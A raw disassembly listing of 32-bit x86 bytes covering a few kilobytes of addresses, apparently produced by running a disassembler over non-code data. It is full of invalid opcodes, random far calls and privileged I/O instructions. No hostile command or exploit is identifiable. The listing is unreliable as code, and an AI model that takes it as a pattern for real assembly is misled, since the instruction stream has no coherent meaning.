  434251:	or     esi,DWORD PTR [esi+ecx*4+0x650da542]
  434258:	test   al,0x29
  43425a:	call   0x7b6d:0x92af5900
  434261:	into   
  434262:	adc    al,0xa9
  434264:	aad    0x2b
  434266:	enter  0x7d01,0x8a
  43426a:	fidivr DWORD PTR ds:0xb658e46c
  434270:	mov    ?,WORD PTR [esi-0x74de60fe]
  434276:	std    
  434277:	mov    BYTE PTR [esi+0x4aebb73c],ch
  43427d:	push   ebx
  43427e:	or     eax,0x657eb254
  434283:	fwait
  434284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434285:	out    dx,eax
  434286:	mov    esp,0x9ae6c311
  43428b:	ins    BYTE PTR es:[edi],dx
  43428c:	and    ah,BYTE PTR [edx-0x72f1cc18]
  434292:	or     eax,0x3e023051
  434297:	xchg   ebx,eax
  434298:	jne    0x4342b8
  43429a:	ins    BYTE PTR es:[edi],dx
  43429b:	enter  0x35b2,0x2b
  43429f:	adc    bh,al
  4342a1:	pusha  
  4342a2:	and    ebx,DWORD PTR [ebx+edi*2-0x40a7e5dd]
  4342a9:	mov    ds:0x6ace0724,eax
  4342ae:	adc    BYTE PTR [esi+0x4d441720],0x2
  4342b5:	or     eax,DWORD PTR [ecx]
  4342b7:	xchg   ecx,eax
  4342b8:	mov    eax,0xb515e055
  4342bd:	xchg   BYTE PTR [esi+edi*4-0x59cf4527],cl
  4342c4:	clc    
  4342c5:	jbe    0x434259
  4342c7:	add    bl,al
  4342c9:	jecxz  0x4342ef
  4342cb:	lods   eax,DWORD PTR ds:[esi]
  4342cc:	mov    bl,0xe5
  4342ce:	mov    esp,0xc683ff53
  4342d3:	pusha  
  4342d4:	push   0x49
  4342d6:	pusha  
  4342d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4342d8:	and    eax,0xc21a798d
  4342dd:	lock mov ecx,0x9ff24163
  4342e3:	dec    edi
  4342e4:	inc    edx
  4342e5:	jae    0x4342ca
  4342e7:	jge    0x43429b
  4342e9:	int    0x41
  4342eb:	ret    0x391d
  4342ee:	sahf   
  4342ef:	mov    ecx,0xb65209a2
  4342f4:	outs   dx,BYTE PTR ds:[esi]
  4342f5:	jbe    0x4342da
  4342f7:	sub    al,0x72
  4342f9:	sub    eax,0x4db2068c
  4342fe:	push   0xfffffff4
  434300:	inc    ecx
  434301:	bswap  esp
  434303:	test   BYTE PTR [ebx+0x4],ah
  434306:	retf   0x58a1
  434309:	es cli 
  43430b:	lods   al,BYTE PTR ds:[esi]
  43430c:	pop    ss
  43430d:	jecxz  0x43432c
  43430f:	mov    ebp,0x3f4a7db2
  434314:	leave  
  434315:	jnp    0x4342d6
  434317:	retf   0xb0c
  43431a:	aad    0x52
  43431c:	jo     0x434382
  43431e:	popf   
  43431f:	mov    WORD PTR [ebp-0x3e],?
  434322:	call   0xeeed:0xb96b8569
  434329:	push   ds
  43432a:	and    DWORD PTR [edi+0x38cff730],0x6e
  434331:	add    eax,0x8cb52df6
  434336:	mov    ebp,0x652793d9
  43433b:	daa    
  43433c:	sbb    eax,0xbf3b91f1
  434341:	or     ecx,DWORD PTR [esi+0x4b488044]
  434347:	or     al,BYTE PTR [edi+0x50]
  43434a:	sub    ah,BYTE PTR ds:0x65e81ab2
  434350:	daa    
  434351:	setge  BYTE PTR [ebx]
  434354:	into   
  434355:	jo     0x434398
  434357:	test   al,0xc
  434359:	aad    0x60
  43435b:	std    
  43435c:	mov    dl,0xac
  43435e:	mov    edx,0x87e3a989
  434363:	sbb    DWORD PTR [si+0x1f9d],esi
  434368:	add    DWORD PTR [edx+0x4a],edx
  43436b:	inc    eax
  43436c:	mov    esi,0x11d7d3ee
  434371:	or     edx,edx
  434373:	mov    cl,0x8c
  434375:	je     0x434343
  434377:	xor    BYTE PTR [ecx],ah
  434379:	call   0x5573:0xda01fc9a
  434380:	(bad)  
  434381:	fiadd  WORD PTR [edi+eiz*4-0x71]
  434385:	in     al,0x77
  434387:	inc    DWORD PTR [edi]
  434389:	in     al,dx
  43438a:	xor    cl,dl
  43438c:	mov    dl,0x4b
  43438e:	sbb    eax,0x572c0cb7
  434393:	pushf  
  434394:	adc    ecx,DWORD PTR [ebx]
  434396:	dec    edx
  434397:	lods   eax,DWORD PTR ds:[esi]
  434398:	xchg   esi,eax
  434399:	mov    esp,0x88a4a387
  43439e:	xchg   esp,eax
  43439f:	inc    ecx
  4343a0:	pop    ss
  4343a1:	pop    ebx
  4343a2:	mov    al,ds:0x3394c587
  4343a7:	jl     0x4343ca
  4343a9:	or     ecx,esi
  4343ab:	pop    esi
  4343ac:	sub    edx,DWORD PTR [ebp+0xaa0c0e3]
  4343b2:	call   0x4fa1:0x2741ac4d
  4343b9:	sbb    ecx,DWORD PTR [ebp+0x182140ac]
  4343bf:	fwait
  4343c0:	xor    ebp,edx
  4343c2:	lock sub eax,DWORD PTR [ecx-0x26]
  4343c6:	jb     0x43435f
  4343c8:	push   ds
  4343c9:	mov    ebp,0x938ad99b
  4343ce:	inc    ebp
  4343cf:	dec    edi
  4343d0:	pop    ds
  4343d1:	mov    ah,0xaa
  4343d3:	fld    QWORD PTR [edx]
  4343d5:	aaa    
  4343d6:	idiv   BYTE PTR [ecx-0x5a]
  4343d9:	inc    ebx
  4343da:	sbb    esi,DWORD PTR [eax-0x4e]
  4343dd:	rcr    BYTE PTR [ecx],1
  4343df:	pop    ebx
  4343e0:	sub    esi,edx
  4343e2:	stos   BYTE PTR es:[edi],al
  4343e3:	xor    al,0xb2
  4343e5:	jne    0x43437e
  4343e7:	nop
  4343e8:	mov    al,ds:0x949856f8
  4343ed:	jge    0x43439b
  4343ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4343f0:	inc    eax
  4343f1:	mov    esi,0x12ad7b13
  4343f6:	push   ebp
  4343f7:	popa   
  4343f8:	mov    dl,0x36
  4343fa:	(bad)  
  4343fb:	in     al,dx
  4343fc:	call   0x210b:0xd866d809
  434403:	ins    BYTE PTR es:[edi],dx
  434404:	test   DWORD PTR ds:0x4317d0ce,ecx
  43440a:	call   0xfe8c:0xdc7425a9
  434411:	xchg   edi,eax
  434412:	xlat   BYTE PTR ds:[ebx]
  434413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434414:	iret   
  434415:	sub    cl,BYTE PTR [ebp+0x5ed67765]
  43441b:	sub    eax,0x24cc5b2
  434420:	inc    bp
  434422:	in     eax,0x75
  434424:	outs   dx,BYTE PTR ds:[esi]
  434425:	xor    eax,0x75b2046b
  43442a:	jle    0x4343e3
  43442c:	push   ecx
  43442d:	push   edi
  43442e:	shl    BYTE PTR [ecx],1
  434430:	mov    dl,0xe3
  434432:	fisub  DWORD PTR [esi+0x3784f6cd]
  434438:	das    
  434439:	adc    al,0x36
  43443b:	push   es
  43443c:	fisttp QWORD PTR [edx]
  43443e:	pop    ecx
  43443f:	xor    al,0x58
  434441:	push   ds
  434442:	inc    esi
  434443:	inc    esp
  434444:	push   0x48
  434446:	sub    cl,ah
  434448:	(bad)  
  434449:	in     eax,dx
  43444a:	xchg   BYTE PTR [eax-0xb],cl
  43444d:	add    BYTE PTR [edi+0x3b],bl
  434450:	stos   DWORD PTR es:[edi],eax
  434451:	(bad)  
  434452:	je     0x4343fb
  434454:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434455:	icebp  
  434456:	mov    ebp,DWORD PTR [edx]
  434458:	ret    
  434459:	lds    edi,FWORD PTR [edx]
  43445b:	popa   
  43445c:	into   
  43445d:	cmp    ebx,DWORD PTR [edx+0x10265474]
  434463:	cli    
  434464:	push   ecx
  434465:	xor    eax,0xe958a4d7
  43446a:	cdq    
  43446b:	test   BYTE PTR [edx-0x1e0f8de5],bh
  434471:	gs cdq 
  434473:	das    
  434474:	mov    esp,0xe62ec71c
  434479:	fcomp  QWORD PTR [edx]
  43447b:	or     ch,al
  43447d:	aaa    
  43447e:	xchg   ecx,eax
  43447f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434480:	icebp  
  434481:	push   ebx
  434482:	xchg   DWORD PTR [ecx-0x1e],ecx
  434485:	ds mov ecx,0xd1acaee9
  43448b:	mov    edi,0x626f0fb5
  434490:	jge    0x43449d
  434492:	ja     0x4344f5
  434494:	frstor [edi+0x1af5b0c4]
  43449a:	dec    ebp
  43449b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43449c:	push   cs
  43449d:	mov    bh,0x45
  43449f:	jne    0x4344b7
  4344a1:	(bad)  
  4344a2:	call   0x2ac8:0x444b6f90
  4344a9:	ins    DWORD PTR es:[edi],dx
  4344aa:	bound  esp,QWORD PTR [edi-0x718d341]
  4344b0:	add    bh,BYTE PTR [edi+eiz*2+0x7533b201]
  4344b7:	hlt    
  4344b8:	push   ss
  4344b9:	pop    esi
  4344ba:	mov    ah,0x30
  4344bc:	dec    ebx
  4344bd:	or     BYTE PTR [ebx+0x4],bl
  4344c0:	dec    edx
  4344c1:	pop    ds
  4344c2:	sbb    bl,BYTE PTR ds:0x3ebf9d2a
  4344c8:	mov    dl,0x99
  4344ca:	mov    ch,0x91
  4344cc:	sub    dl,bl
  4344ce:	aam    0x98
  4344d0:	into   
  4344d1:	or     esp,DWORD PTR [esi+0xb0add72]
  4344d7:	test   edi,edi
  4344d9:	push   ds
  4344da:	call   0xd30b:0x67222206
  4344e1:	dec    esi
  4344e2:	mov    WORD PTR [edx-0x4635cfa6],cs
  4344e8:	push   esi
  4344e9:	out    dx,al
  4344ea:	call   0x72b5:0x6256164
  4344f1:	outs   dx,BYTE PTR ds:[esi]
  4344f2:	inc    edx
  4344f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4344f4:	sub    ebp,edi
  4344f6:	imul   ebp,ebx,0xcc3001b7
  4344fc:	scas   eax,DWORD PTR es:[edi]
  4344fd:	(bad)  
  4344fe:	push   edx
  4344ff:	mov    ebp,0x8a5f1cf2
  434504:	pop    eax
  434505:	ror    BYTE PTR [edi+eiz*4+0x66],1
  434509:	iret   
  43450a:	leave  
  43450b:	aas    
  43450c:	add    DWORD PTR [edx],ebp
  43450e:	sbb    BYTE PTR cs:[ebx-0x2dc2e2e2],dh
  434515:	lods   al,BYTE PTR ds:[esi]
  434516:	push   ss
  434517:	test   BYTE PTR [ebp-0x5],ah
  43451a:	je     0x4344b1
  43451c:	imul   ecx,DWORD PTR [ebx],0x4782d54b
  434522:	fistp  DWORD PTR [esi+edi*4-0x8a06590]
  434529:	mov    fs,WORD PTR ds:0xbe3435d0
  43452f:	scas   al,BYTE PTR es:[edi]
  434530:	fs push ecx
  434532:	stc    
  434533:	out    0x35,eax
  434535:	inc    eax
  434536:	sub    eax,0xb0665cf7
  43453b:	mov    ch,0x56
  43453d:	sbb    DWORD PTR [edx-0x28870f4f],0xbbd18818
  434547:	mov    eax,0x67c33bdd
  43454c:	or     eax,ebx
  43454e:	rcr    DWORD PTR [edi-0x6f],0x9
  434552:	call   0x38d3:0x297952a1
  434559:	add    ch,BYTE PTR [ecx-0x59]
  43455c:	dec    ebx
  43455d:	mov    ds:0xf3c1eba1,eax
  434562:	pop    ecx
  434563:	ja     0x4345c1
  434565:	pop    edi
  434566:	xchg   esp,eax
  434567:	jg     0x4345bc
  434569:	cmp    al,0xc8
  43456b:	icebp  
  43456c:	sbb    al,0x9
  43456e:	call   0x921a:0x7a15cbef
  434575:	nop
  434576:	popf   
  434577:	sahf   
  434578:	out    0xaa,al
  43457a:	int3   
  43457b:	jae    0x43451f
  43457d:	outs   dx,DWORD PTR ds:[esi]
  43457e:	iret   
  43457f:	dec    ebx
  434580:	mov    esi,0xf4cda00a
  434585:	jp     0x43451a
  434587:	adc    DWORD PTR [edx-0x31],esp
  43458a:	aas    
  43458b:	in     eax,dx
  43458c:	mov    dl,0xcc
  43458e:	sbb    BYTE PTR [edi],0xa4
  434591:	or     bl,bl
  434593:	mov    ds:0xbbd40b73,eax
  434598:	adc    ch,ch
  43459a:	fsub   st(3),st
  43459c:	pop    ebx
  43459d:	(bad)  
  43459e:	fwait
  43459f:	pusha  
  4345a0:	mov    ds:0x15121154,eax
  4345a5:	clc    
  4345a6:	dec    esi
  4345a7:	push   edi
  4345a8:	mov    ebp,0xa5d1210b
  4345ad:	xchg   esi,eax
  4345ae:	mov    ch,0x4c
  4345b0:	mov    ss,WORD PTR [ebx-0x66]
  4345b3:	jmp    0x6c64:0x67124fae
  4345ba:	or     DWORD PTR [edx+0x67e36767],edi
  4345c0:	push   es
  4345c1:	xchg   edx,eax
  4345c2:	xchg   DWORD PTR [edi+eiz*8],ebx
  4345c5:	mov    ds:0x3a557c9a,eax
  4345ca:	mov    es:0xa7e845f1,al
  4345d0:	add    BYTE PTR [ebp+0x10],cl
  4345d3:	mov    ebx,0xa9534c60
  4345d8:	mov    ch,0xd3
  4345da:	fist   DWORD PTR [ecx-0x45]
  4345dd:	out    0x79,eax
  4345df:	xor    DWORD PTR [ecx-0x55],edi
  4345e2:	ret    
  4345e3:	push   ebp
  4345e4:	mov    BYTE PTR [ebx+0x2362a74c],bl
  4345ea:	add    dh,BYTE PTR ds:0xb2560008
  4345f0:	mov    dl,0x85
  4345f2:	add    al,ah
  4345f4:	inc    esp
  4345f5:	push   ecx
  4345f6:	mov    ah,0x46
  4345f8:	(bad)  
  4345fb:	rcl    DWORD PTR [edx],cl
  4345fd:	scas   al,BYTE PTR es:[edi]
  4345fe:	cmp    ch,BYTE PTR [edx+0x6d]
  434601:	push   eax
  434602:	call   0x41:0xc654333e
  434609:	call   0x9372:0x14d4a700
  434610:	leave  
  434611:	loop   0x4345b8
  434613:	inc    edx
  434614:	scas   al,BYTE PTR es:[edi]
  434615:	xor    eax,0x41b57c19
  43461a:	sahf   
  43461b:	pop    edx
  43461c:	ret    0x96b6
  43461f:	dec    edx
  434620:	call   0x8f23312
  434625:	jg     0x43466a
  434627:	sbb    DWORD PTR [edx],esi
  434629:	push   ds
  43462a:	ds int 0x45
  43462d:	push   ebx
  43462e:	call   0x3575:0xd9560b5f
  434635:	mov    al,BYTE PTR [eax-0x4b01ec58]
  43463b:	aaa    
  43463c:	jb     0x4345d7
  43463e:	and    ch,BYTE PTR [edx]
  434640:	ror    bh,cl
  434642:	call   0x65e9:0x1199466
  434649:	(bad)  
  43464a:	jmp    0x543926f6
  43464f:	aaa    
  434650:	and    BYTE PTR [ebx+ebx*1],dh
  434653:	xchg   esp,eax
  434654:	mov    dl,0xd
  434656:	add    BYTE PTR [esi*4-0x67fd850a],dh
  43465d:	or     DWORD PTR [esp+edx*2-0x4d18e72],ebp
  434664:	rol    BYTE PTR ds:0xfd894b9e,cl
  43466a:	sbb    DWORD PTR [ecx-0x3a6567c9],eax
  434670:	imul   ebx,DWORD PTR [ecx+0xb5940f0],0xd7981d5f
  43467a:	add    eax,0x9ad4a615
  43467f:	jno    0x43460f
  434681:	or     DWORD PTR [ebp+ebp*2+0x4ec67ac0],edx
  434688:	jle    0x4346d5
  43468a:	int3   
  43468b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43468c:	cmc    
  43468d:	cmp    ebp,DWORD PTR [eax-0x13]
  434690:	sbb    ecx,edx
  434692:	cmc    
  434693:	mov    ebp,0x7cbdcbb1
  434698:	popa   
  434699:	jecxz  0x4346fd
  43469b:	aaa    
  43469c:	xchg   ecx,eax
  43469d:	jbe    0x434643
  43469f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4346a0:	pusha  
  4346a1:	(bad)  
  4346a2:	mov    esp,0xa8387a43
  4346a7:	jmp    0xe45b:0x68aa4eb2
  4346ae:	sub    al,0x62
  4346b0:	in     eax,dx
  4346b1:	or     DWORD PTR [edx-0x6f],esi
  4346b4:	pop    es
  4346b5:	sbb    eax,0xe9323279
  4346ba:	jl     0x434722
  4346bc:	sti    
  4346bd:	sub    esp,DWORD PTR [esi-0xc]
  4346c0:	mov    dl,0xa4
  4346c2:	test   eax,0xf73f492d
  4346c7:	or     bh,BYTE PTR ds:0x26c6770b
  4346cd:	jns    0x434700
  4346cf:	ja     0x43474a
  4346d1:	retf   
  4346d2:	call   0x5c18:0xa05352f1
  4346d9:	outs   dx,BYTE PTR ds:[esi]
  4346da:	mov    ah,0xdc
  4346dc:	ror    DWORD PTR [ebx],0xf3
  4346df:	lea    edx,[ecx-0x4dd89b8]
  4346e5:	pop    edi
  4346e6:	call   0x31c8:0xa0df87a6
  4346ed:	das    
  4346ee:	jp     0x434697
  4346f0:	fist   DWORD PTR [edx-0xc]
  4346f3:	in     eax,dx
  4346f4:	adc    eax,0xb25c0a22
  4346f9:	pop    ebx
  4346fa:	scas   al,BYTE PTR es:[edi]
  4346fb:	mov    dh,0xe8
  4346fd:	cmc    
  4346fe:	shr    BYTE PTR [edi-0x2370f40c],cl
  434704:	push   es
  434705:	mov    esp,0xe594173
  43470a:	call   0xe535:0x613a651c
  434711:	das    
  434712:	loopne 0x4346bb
  434714:	xchg   DWORD PTR [ecx+0x4c],edx
  434717:	add    ebx,0xb2153f01
  43471d:	addr16 into 
  43471f:	inc    esp
  434720:	icebp  
  434721:	jmp    0x4346a9
  434723:	popa   
  434724:	mov    ah,0xb
  434726:	arpl   WORD PTR [ecx],bp
  434728:	xor    BYTE PTR [edx+0x13],al
  43472b:	std    
  43472c:	sub    esi,DWORD PTR [eax-0x67]
  43472f:	loop   0x4346d3
  434731:	daa    
  434732:	push   0x78fbcec3
  434737:	out    0x8,al
  434739:	or     esi,DWORD PTR [edi+0x3f]
  43473c:	xchg   esi,eax
  43473d:	sbb    DWORD PTR [esi],0xede133ab
  434743:	sti    
  434744:	retf   0x9a6c
  434747:	enter  0x407e,0xd7
  43474b:	mov    WORD PTR ds:0x43a7ca7c,ds
  434751:	mov    BYTE PTR [edx],cl
  434753:	lea    esp,[edx+edx*8-0x704d8c45]
  43475a:	mov    ebp,0x2c9f504
  43475f:	jo     0x43470a
  434761:	add    eax,0xcfb61a2a
  434766:	(bad)  
  434768:	cmp    al,0xa3
  43476a:	shr    BYTE PTR [edx+esi*4-0x66e3548b],1
  434771:	pop    esp
  434772:	clc    
  434773:	ror    DWORD PTR [ebx-0x734644f5],1
  434779:	fadd   DWORD PTR [eax-0x5b546365]
  43477f:	xchg   ecx,eax
  434780:	dec    eax
  434781:	aad    0x66
  434783:	mov    WORD PTR ss:[ebp+0x1a],?
  434787:	(bad)  ds:0x20392416
  43478d:	jbe    0x434729
  43478f:	mov    bl,BYTE PTR [ebx+0x3d002b1a]
  434795:	inc    ebp
  434796:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434798:	sahf   
  434799:	retf   0x3416
  43479c:	inc    ebx
  43479d:	xchg   esi,eax
  43479e:	jne    0x4347d1
  4347a0:	mov    dl,0x4
  4347a2:	jo     0x434755
  4347a4:	push   esi
  4347a5:	rcr    BYTE PTR [ecx+0x240bc3a1],1
  4347ab:	jnp    0x4347a1
  4347ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4347ae:	jnp    0x4347c1
  4347b0:	xor    al,0x55
  4347b2:	call   0xbc39:0x93241168
  4347b9:	pop    edi
  4347ba:	cmp    BYTE PTR [edi+0x27269d60],ah
  4347c0:	jmp    0x4347f8
  4347c2:	xchg   edx,eax
  4347c3:	jmp    0xa121:0x7b9e6fb2
  4347ca:	rcr    BYTE PTR [ecx+0x1a],cl
  4347cd:	or     al,BYTE PTR [edx+0x72]
  4347d0:	loop   0x43476f
  4347d2:	stos   DWORD PTR es:[edi],eax
  4347d3:	stos   DWORD PTR es:[edi],eax
  4347d4:	imul   ebp,DWORD PTR [ebx-0x6b],0x7c8cb31a
  4347db:	pop    esi
  4347dc:	mov    al,ds:0xd2da5ed2
  4347e1:	icebp  
  4347e2:	xor    BYTE PTR [edi-0x478ea385],ah
  4347e8:	adc    al,0x15
  4347ea:	sahf   
  4347eb:	dec    edi
  4347ec:	mov    bl,0xff
  4347ee:	stos   DWORD PTR es:[edi],eax
  4347ef:	into   
  4347f0:	imul   dh
  4347f2:	jp     0x43482e
  4347f4:	push   edx
  4347f5:	ds xchg ecx,eax
  4347f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4347f8:	jecxz  0x4347b8
  4347fa:	cmp    bh,BYTE PTR [eax-0x5]
  4347fd:	xor    DWORD PTR [esi-0x66b0fdd6],esp
  434803:	xchg   ebx,eax
  434804:	inc    ebp
  434805:	arpl   WORD PTR [esi+0x43],bx
  434808:	mov    eax,0x6c5ddf93
  43480d:	or     ebp,DWORD PTR [ebp+edx*1-0x3a]
  434811:	inc    eax
  434812:	ja     0x4347f4
  434814:	xchg   edi,eax
  434815:	ins    BYTE PTR es:[edi],dx
  434816:	call   0x3ebb:0xd83834f1
  43481d:	fdivr  QWORD PTR [edi-0x59]
  434820:	mov    ebx,0xc05576e4
  434825:	adc    al,0x77
  434827:	int3   
  434828:	mov    dl,0xb5
  43482a:	stc    
  43482b:	xor    al,0x12
  43482d:	test   al,0x57
  43482f:	pop    ss
  434830:	loopne 0x43483d
  434832:	hlt    
  434833:	mov    edi,0x52a72615
  434838:	mov    ?,WORD PTR [eax-0x63]
  43483b:	push   0xf1aa1c5d
  434840:	jae    0x4347e6
  434842:	sar    BYTE PTR ds:0x5e556b68,0x15
  434849:	or     esp,DWORD PTR [eax+0x7a03471d]
  43484f:	arpl   WORD PTR [ebx+0x25],bp
  434852:	call   0xebad:0x6b5306a5
  434859:	in     al,0x4a
  43485b:	fidiv  DWORD PTR [edx+ecx*1]
  43485e:	dec    ecx
  43485f:	fild   DWORD PTR [ebp-0x56]
  434862:	xchg   edi,eax
  434863:	or     dh,BYTE PTR [ecx-0x420d7a0d]
  434869:	loop   0x4348e3
  43486b:	add    al,0xe2
  43486d:	imul   edi,DWORD PTR [ecx+0x491eaa29],0xffffffa7
  434874:	add    bl,BYTE PTR [edx]
  434876:	stos   DWORD PTR es:[edi],eax
  434877:	dec    ebp
  434878:	jae    0x4348d3
  43487a:	scas   eax,DWORD PTR es:[edi]
  43487b:	outs   dx,DWORD PTR ds:[esi]
  43487c:	mov    bl,0xac
  43487e:	dec    ebp
  43487f:	pop    ds
  434880:	mov    DWORD PTR ds:0xbfc28e94,ebx
  434886:	ins    DWORD PTR es:[edi],dx
  434887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434888:	dec    edi
  434889:	cmc    
  43488a:	sbb    ebx,DWORD PTR [edx+0x4484fd01]
  434890:	mov    dl,0xd8
  434892:	inc    edi
  434893:	add    edx,esp
  434895:	or     BYTE PTR [ebp+0x450b2fb4],ah
  43489b:	mov    ds,WORD PTR [edi]
  43489d:	ror    DWORD PTR [eax+0x29],cl
  4348a0:	cdq    
  4348a1:	mov    edx,0xd7749b9b
  4348a6:	mov    ecx,DWORD PTR [esi-0x31]
  4348a9:	pop    es
  4348aa:	fs out 0x5,eax
  4348ad:	xor    DWORD PTR [eax-0x59],esi
  4348b0:	sub    eax,0x3d583129
  4348b5:	into   
  4348b6:	(bad)  
  4348b7:	retf   0x9fb3
  4348ba:	mov    DWORD PTR [esi-0x222ea29a],ecx
  4348c0:	push   esi
  4348c1:	ins    BYTE PTR es:[edi],dx
  4348c2:	or     BYTE PTR [edi-0x1e93bb01],ah
  4348c8:	adc    esi,DWORD PTR [edi-0x49bbd1eb]
  4348ce:	call   0xc0be:0x91bcdee
  4348d5:	rcl    DWORD PTR [edi-0x7698a459],0x81
  4348dc:	data16 mov al,0x3e
  4348df:	nop
  4348e0:	ret    
  4348e1:	jb     0x43487d
  4348e3:	mov    ds:0x267ab5e8,eax
  4348e8:	(bad)  
  4348e9:	clc    
  4348ea:	jne    0x4348a0
  4348ec:	cwde   
  4348ed:	xchg   DWORD PTR [ebx+0x112fb0a7],ecx
  4348f3:	jb     0x4348c0
  4348f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4348f6:	call   0x18d4:0xd39094ef
  4348fd:	jg     0x43496d
  4348ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434900:	clc    
  434901:	es dec ebx
  434903:	mov    eax,ds:0x57cc2acd
  434908:	mov    dl,0x86
  43490a:	std    
  43490b:	xchg   edi,eax
  43490c:	and    eax,0x812cf707
  434911:	or     esi,DWORD PTR [esi-0x14]
  434914:	jp     0x43493c
  434916:	test   DWORD PTR [ebp-0x436519bd],eax
  43491c:	xchg   ebx,eax
  43491d:	loope  0x434987
  43491f:	ins    DWORD PTR es:[edi],dx
  434920:	aad    0x34
  434922:	aam    0xa7
  434924:	xor    esi,esi
  434926:	lods   eax,DWORD PTR ds:[esi]
  434927:	adc    BYTE PTR [eax],ah
  434929:	push   ds
  43492a:	and    esp,DWORD PTR [ebp-0x6]
  43492d:	ficom  WORD PTR [ecx-0x59]
  434930:	shl    DWORD PTR [edx],cl
  434932:	jmp    0x7ca7:0x41734d50
  434939:	jmp    0x6894:0xae2ce32a
  434940:	mov    cl,0x3e
  434942:	cdq    
  434943:	jo     0x434905
  434945:	rcr    DWORD PTR cs:[edi],1
  434948:	mov    al,0x29
  43494a:	or     BYTE PTR [edi-0x6b5cebf7],ah
  434950:	push   ebx
  434951:	enter  0xf944,0xb2
  434955:	mov    al,ds:0xa79c693a
  43495a:	jne    0x43499a
  43495c:	and    al,0xb
  43495e:	cmp    BYTE PTR [ebx-0x71],dl
  434961:	mov    edx,0x88a881f0
  434966:	jp     0x4349b8
  434968:	mov    ch,0x6f
  43496a:	shl    BYTE PTR cs:[esi-0x7c],0x28
  43496f:	mov    ds:0x9eefeb72,al
  434974:	mov    ch,0xb
  434976:	dec    ecx
  434977:	jns    0x4349c6
  434979:	mov    eax,esi
  43497b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43497c:	and    BYTE PTR [edx-0x6cbc7066],bl
  434982:	add    al,0xbd
  434984:	mov    bh,0xe6
  434986:	scas   al,BYTE PTR es:[edi]
  434987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434988:	popf   
  434989:	mov    ebp,0xcf003449
  43498e:	(bad)  
  43498f:	fwait
  434990:	mov    ch,0xd1
  434992:	jnp    0x4349f1
  434994:	lods   al,BYTE PTR ds:[esi]
  434995:	fs frstpm(287 only) 
  434998:	xor    edx,0x66
  43499b:	add    al,0xcc
  43499d:	repz shl DWORD PTR [ebp-0x7300e8d9],0x91
  4349a5:	(bad)  
  4349a6:	fld    TBYTE PTR [ebx+ebx*8-0x5]
  4349aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4349ab:	push   edx
  4349ac:	mov    bl,0x56
  4349ae:	dec    edi
  4349af:	test   al,0xb3
  4349b1:	aaa    
  4349b2:	cmp    BYTE PTR [edx+0x4bf17062],bh
  4349b8:	ss pop ss
  4349ba:	dec    edx
  4349bb:	(bad)  
  4349bc:	hlt    
  4349bd:	dec    ebx
  4349be:	sti    
  4349bf:	pop    ss
  4349c0:	jne    0x43494f
  4349c2:	(bad)  
  4349c3:	imul   BYTE PTR [edi-0x114422f2]
  4349c9:	dec    eax
  4349ca:	inc    esi
  4349cb:	xor    DWORD PTR [edx-0x63],0x5e7851ac
  4349d2:	mov    edx,0x5ba6e2a7
  4349d7:	push   esi
  4349d8:	retf   0xfe82
  4349db:	and    eax,0x69c236b2
  4349e0:	or     ch,cl
  4349e2:	ror    BYTE PTR [esp+ebp*2+0xb],cl
  4349e6:	hlt    
  4349e7:	push   ebx
  4349e8:	inc    edi
  4349e9:	mov    esi,0xe81d29bb
  4349ee:	popf   
  4349ef:	cli    
  4349f0:	fwait
  4349f1:	push   0xffffffc6
  4349f3:	jno    0x4349d7
  4349f5:	add    bl,BYTE PTR [edi]
  4349f7:	jmp    0x81b64f5c
  4349fc:	and    ch,BYTE PTR [ebx+0x64d48df9]
  434a02:	jb     0x4349c3
  434a04:	add    esp,DWORD PTR [eax-0x426c2a65]
  434a0a:	mov    ch,0x54
  434a0c:	leave  
  434a0d:	cmp    BYTE PTR [edx+0x76],0x21
  434a11:	or     ebx,edx
  434a13:	fistp  DWORD PTR [ebp+0x33]
  434a16:	jae    0x4349dc
  434a18:	in     ax,0x9a
  434a1b:	in     eax,0x9c
  434a1d:	cmp    ecx,DWORD PTR [edx-0x5f]
  434a20:	push   cs
  434a21:	jecxz  0x434a7a
  434a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434a24:	mov    bl,0xd7
  434a26:	test   ecx,esp
  434a28:	retf   
  434a29:	pop    ebx
  434a2a:	ror    DWORD PTR [ebp+0x3d60f6b2],0x43
  434a31:	(bad)  
  434a32:	pop    ebx
  434a33:	mov    dh,0x3f
  434a35:	or     esi,DWORD PTR [ecx+ebp*2-0x10]
  434a39:	push   esp
  434a3a:	daa    
  434a3b:	add    eax,0xe69e0a34
  434a40:	mov    ah,0x94
  434a42:	mov    BYTE PTR [edx],ah
  434a44:	or     al,0xb
  434a46:	and    eax,DWORD PTR [edi+0x62f850a3]
  434a4c:	mov    cl,0x1d
  434a4e:	stos   DWORD PTR es:[edi],eax
  434a4f:	sub    edi,0x8b470380
  434a55:	test   eax,0xe6f0ba10
  434a5a:	and    DWORD PTR [edi],esp
  434a5c:	or     eax,0xa38b920c
  434a61:	dec    ebx
  434a62:	mov    dl,0xce
  434a64:	scas   eax,DWORD PTR es:[edi]
  434a65:	stos   BYTE PTR es:[edi],al
  434a66:	call   0x130b:0x411f4782
  434a6d:	(bad)  
  434a6e:	lock mov al,ds:0x42d80658
  434a74:	jns    0x434a2e
  434a76:	(bad)  
  434a77:	xlat   BYTE PTR ds:[ebx]
  434a78:	bound  ebp,QWORD PTR [ecx]
  434a7a:	jmp    DWORD PTR [ebp-0x4e]
